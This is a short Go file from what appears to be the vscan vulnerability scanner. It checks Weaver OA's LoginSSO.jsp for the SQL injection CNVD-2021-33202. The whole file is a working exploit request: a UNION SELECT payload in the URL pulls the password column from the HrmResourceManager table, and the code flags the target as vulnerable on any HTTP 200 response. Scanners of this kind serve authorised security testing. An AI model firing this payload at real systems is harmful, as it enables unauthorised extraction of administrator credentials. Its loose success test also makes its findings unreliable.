package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
)

// LoginSSO.jsp SQL注入漏洞 CNVD-2021-33202

func LoginSSOSql(u string) bool {
	if req, err := pkg.HttpRequset(u+"/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver LoginSSOSql|%s\n", u+"/upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager"))

			return true
		}
	}
	return false
}